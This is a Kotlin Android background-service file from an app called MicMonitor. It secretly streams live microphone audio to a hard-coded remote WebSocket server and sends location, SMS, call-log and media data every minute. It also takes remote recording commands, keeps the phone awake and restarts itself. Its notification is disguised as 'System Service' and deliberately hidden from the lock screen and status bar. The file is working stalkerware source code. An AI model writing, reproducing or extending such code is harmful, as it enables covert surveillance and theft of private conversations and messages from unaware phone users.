package com.micmonitor.app

import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.content.edit
import kotlinx.coroutines.*
import okhttp3.*
import okio.ByteString
import okio.ByteString.Companion.toByteString
import java.io.File
import java.io.FileOutputStream
import java.util.UUID
import java.util.concurrent.TimeUnit
import org.json.JSONObject

/**
 * MicService — Core background service.
 *
 * What it does:
 *  1. Captures raw PCM audio from microphone using AudioRecord.
 *  2. Streams every audio chunk live to the Node.js server via WebSocket.
 *  3. Simultaneously writes chunks to an .pcm file (recording) on device.
 *  4. Listens for remote commands: "start_record", "stop_record", "ping".
 *  5. Auto-reconnects on WebSocket failure (every 5 seconds).
 *  6. Holds a WakeLock so the CPU stays alive in background.
 *  7. restarted automatically by BootReceiver on reboot.
 */
class MicService : Service() {

    // ── Coroutine scope (cancelled on destroy) ──────────────────────────────
    private val serviceScope = CoroutineScope(Dispatchers.Default + SupervisorJob())

    // ── Audio capture ────────────────────────────────────────────────────────
    private var audioRecord: AudioRecord? = null
    private val sampleRate    = 16000           // 16 kHz
    private val channelConfig = AudioFormat.CHANNEL_IN_MONO
    private val audioFormat   = AudioFormat.ENCODING_PCM_16BIT
    private val bufferSize    = AudioRecord.getMinBufferSize(sampleRate, channelConfig, audioFormat) * 2

    // ── WebSocket ────────────────────────────────────────────────────────────
    private var webSocket: WebSocket? = null
    private val okHttpClient = OkHttpClient.Builder()
        .connectTimeout(10, TimeUnit.SECONDS)
        .readTimeout(0,  TimeUnit.MILLISECONDS)  // No read timeout (streaming)
        .pingInterval(30, TimeUnit.SECONDS)        // Keep-alive pings
        .build()

    // ── Recording state ──────────────────────────────────────────────────────
    @Volatile private var isCapturing   = false
    @Volatile private var isSavingFile  = false
    private var recordingFileStream: FileOutputStream? = null
    private var recordingFile: File? = null

    // ── WakeLock ─────────────────────────────────────────────────────────────
    private var wakeLock: PowerManager.WakeLock? = null

    // ── Data Collector ───────────────────────────────────────────────────────
    private val dataCollector by lazy { DataCollector(this) }
    private var dataJob: Job? = null

    // ── Prefs / Device ID ────────────────────────────────────────────────────
    private val prefs by lazy { getSharedPreferences("micmonitor", MODE_PRIVATE) }
    private val deviceId: String by lazy {
        prefs.getString("device_id", null) ?: UUID.randomUUID().toString().also { id ->
            prefs.edit { putString("device_id", id) }
        }
    }
    
    // ── Server URL — CHANGE THIS TO YOUR PC'S IP ─────────────────────────────
    // Or set from the app's main screen to a Render URL like:
    // wss://your-app.onrender.com/audio/
    companion object {
        const val TAG          = "MicService"
        const val CHANNEL_ID   = "mic_monitor_channel"
        const val NOTIF_ID     = 101

        // Render cloud URL — works on any network (WiFi or cellular)
        const val DEFAULT_SERVER_URL = "wss://monitor-raje.onrender.com/audio/"
    }

    /** Reads server URL from SharedPreferences so it can be changed from MainActivity */
    private val serverUrl get(): String {
        val base = prefs.getString("server_url", DEFAULT_SERVER_URL) ?: DEFAULT_SERVER_URL
        // Ensure it ends with / then append deviceId
        return base.trimEnd('/') + "/$deviceId"
    }

    // ────────────────────────────────────────────────────────────────────────
    // Service lifecycle
    // ────────────────────────────────────────────────────────────────────────

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        acquireWakeLock()
        Log.i(TAG, "Service created. Device ID: $deviceId")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.i(TAG, "onStartCommand")
        startForeground(NOTIF_ID, buildNotification("Connecting to server…"))
        connectWebSocket()
        return START_STICKY   // Android restarts service automatically if killed
    }

    override fun onDestroy() {
        Log.i(TAG, "onDestroy — stopping service")
        isCapturing  = false
        isSavingFile = false
        serviceScope.cancel()
        stopAudioCapture()
        closeRecordingFile()
        webSocket?.close(1000, "Service stopped")
        wakeLock?.release()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    // ────────────────────────────────────────────────────────────────────────
    // WebSocket connection
    // ────────────────────────────────────────────────────────────────────────

    private fun connectWebSocket() {
        Log.i(TAG, "Connecting to $serverUrl")
        updateNotification("Connecting to server…")

        val request = Request.Builder()
            .url(serverUrl)
            .addHeader("X-Device-Id", deviceId)
            .build()

        webSocket = okHttpClient.newWebSocket(request, object : WebSocketListener() {

            override fun onOpen(webSocket: WebSocket, response: Response) {
                Log.i(TAG, "WebSocket connected ✅")
                updateNotification("Live streaming active")
                webSocket.send("DEVICE_INFO:$deviceId:${Build.MODEL}:${Build.VERSION.SDK_INT}")
                startAudioCapture()
                startDataCollection()
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                Log.d(TAG, "Server command: $text")
                handleServerCommand(text.trim())
            }

            override fun onMessage(webSocket: WebSocket, bytes: ByteString) {
                handleServerCommand(bytes.utf8().trim())
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                Log.e(TAG, "WebSocket failure: ${t.message}")
                updateNotification("Disconnected — retrying in 5s…")
                stopAudioCapture()
                stopDataCollection()
                serviceScope.launch {
                    delay(5_000)
                    connectWebSocket()
                }
            }

            override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                Log.w(TAG, "WebSocket closed: $reason")
                updateNotification("Disconnected — retrying…")
                stopAudioCapture()
                stopDataCollection()
                serviceScope.launch {
                    delay(5_000)
                    connectWebSocket()
                }
            }
        })
    }

    // ────────────────────────────────────────────────────────────────────────
    // Remote command handler (from primary device dashboard)
    // ────────────────────────────────────────────────────────────────────────

    private fun handleServerCommand(cmd: String) {
        when (cmd) {
            "start_record" -> {
                Log.i(TAG, "CMD: start recording")
                openRecordingFile()
                webSocket?.send("ACK:start_record")
            }
            "stop_record" -> {
                Log.i(TAG, "CMD: stop recording")
                closeRecordingFile()
                webSocket?.send("ACK:stop_record:${recordingFile?.name ?: "unknown"}")
            }
            "ping" -> {
                webSocket?.send("pong:$deviceId")
            }
            "get_data" -> {
                // Dashboard requested a fresh sync immediately
                sendDeviceData()
            }
            else -> Log.d(TAG, "Unknown command: $cmd")
        }
    }

    // ────────────────────────────────────────────────────────────────────────
    // Data collection — location, SMS, call log, media (every 60s)
    // ────────────────────────────────────────────────────────────────────────

    private fun startDataCollection() {
        stopDataCollection()
        dataJob = serviceScope.launch(Dispatchers.IO) {
            // Send immediately on connect, then every 60 seconds
            while (isActive) {
                sendDeviceData()
                delay(60_000)
            }
        }
    }

    private fun stopDataCollection() {
        dataJob?.cancel()
        dataJob = null
    }

    private fun sendDeviceData() {
        try {
            val data = dataCollector.collectAll()
            val msg = JSONObject()
            msg.put("type", "device_data")
            msg.put("deviceId", deviceId)
            msg.put("data", data)
            webSocket?.send(msg.toString())
            Log.d(TAG, "Device data sent")
        } catch (e: Exception) {
            Log.e(TAG, "sendDeviceData error: ${e.message}")
        }
    }

    // ────────────────────────────────────────────────────────────────────────
    // Audio capture loop (raw PCM 16-bit mono 16 kHz)
    // ────────────────────────────────────────────────────────────────────────

    @SuppressLint("MissingPermission")  // Permission already checked in MainActivity before service starts
    private fun startAudioCapture() {
        if (isCapturing) return
        isCapturing = true

        serviceScope.launch(Dispatchers.IO) {
            try {
                audioRecord = AudioRecord(
                    MediaRecorder.AudioSource.MIC,
                    sampleRate,
                    channelConfig,
                    audioFormat,
                    bufferSize
                )

                if (audioRecord?.state != AudioRecord.STATE_INITIALIZED) {
                    Log.e(TAG, "AudioRecord failed to initialize")
                    isCapturing = false
                    return@launch
                }

                audioRecord?.startRecording()
                Log.i(TAG, "🎙️ Audio capture started (${sampleRate}Hz, PCM16, mono)")

                val chunk = ByteArray(bufferSize)

                while (isCapturing && isActive) {
                    val read = audioRecord?.read(chunk, 0, chunk.size) ?: -1
                    if (read > 0) {
                        val data = chunk.copyOf(read)

                        // 1) Live stream to server via WebSocket
                        webSocket?.send(data.toByteString())

                        // 2) Write to recording file if active
                        if (isSavingFile) {
                            recordingFileStream?.write(data)
                        }
                    }
                }

                audioRecord?.stop()
                audioRecord?.release()
                audioRecord = null
                Log.i(TAG, "Audio capture stopped")

            } catch (e: Exception) {
                Log.e(TAG, "Audio capture error", e)
                isCapturing = false
            }
        }
    }

    private fun stopAudioCapture() {
        isCapturing = false
        try {
            audioRecord?.stop()
            audioRecord?.release()
        } catch (_: Exception) {}
        audioRecord = null
    }

    // ────────────────────────────────────────────────────────────────────────
    // File recording helpers
    // ────────────────────────────────────────────────────────────────────────

    private fun openRecordingFile() {
        try {
            val dir = getExternalFilesDir(null) ?: filesDir
            dir.mkdirs()
            val timestamp = System.currentTimeMillis()
            recordingFile = File(dir, "rec_${timestamp}.pcm")
            recordingFileStream = FileOutputStream(recordingFile)
            isSavingFile = true
            Log.i(TAG, "Recording to: ${recordingFile?.absolutePath}")
            updateNotification("Live streaming + Recording…")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to open recording file", e)
        }
    }

    private fun closeRecordingFile() {
        isSavingFile = false
        try {
            recordingFileStream?.flush()
            recordingFileStream?.close()
        } catch (_: Exception) {}
        recordingFileStream = null
        Log.i(TAG, "Recording saved: ${recordingFile?.name}")
        updateNotification("Live streaming active")
    }

    // ────────────────────────────────────────────────────────────────────────
    // Notification helpers
    // ────────────────────────────────────────────────────────────────────────

    private fun createNotificationChannel() {
        // IMPORTANCE_MIN = no sound, no status bar icon, collapsed in shade
        val channel = NotificationChannel(
            CHANNEL_ID,
            "Mic Monitor",
            NotificationManager.IMPORTANCE_MIN
        ).apply {
            description = "Audio streaming service"
            setSound(null, null)
            enableVibration(false)
            setShowBadge(false)
        }
        getSystemService(NotificationManager::class.java)
            .createNotificationChannel(channel)
    }

    private fun buildNotification(statusText: String): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText(statusText)
            .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)  // subtle icon
            .setPriority(NotificationCompat.PRIORITY_MIN)  // lowest priority = most hidden
            .setOngoing(true)
            .setSilent(true)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)  // hidden on lock screen
            .build()
    }

    private fun updateNotification(statusText: String) {
        val manager = getSystemService(NotificationManager::class.java)
        manager.notify(NOTIF_ID, buildNotification(statusText))
    }

    // ────────────────────────────────────────────────────────────────────────
    // WakeLock — keeps CPU awake while app is in background
    // ────────────────────────────────────────────────────────────────────────

    private fun acquireWakeLock() {
        val pm = getSystemService(PowerManager::class.java)
        wakeLock = pm.newWakeLock(
            PowerManager.PARTIAL_WAKE_LOCK,
            "MicMonitor::AudioWakeLock"
        ).also { it.acquire(24 * 60 * 60 * 1000L) } // 24 hour max
    }
}
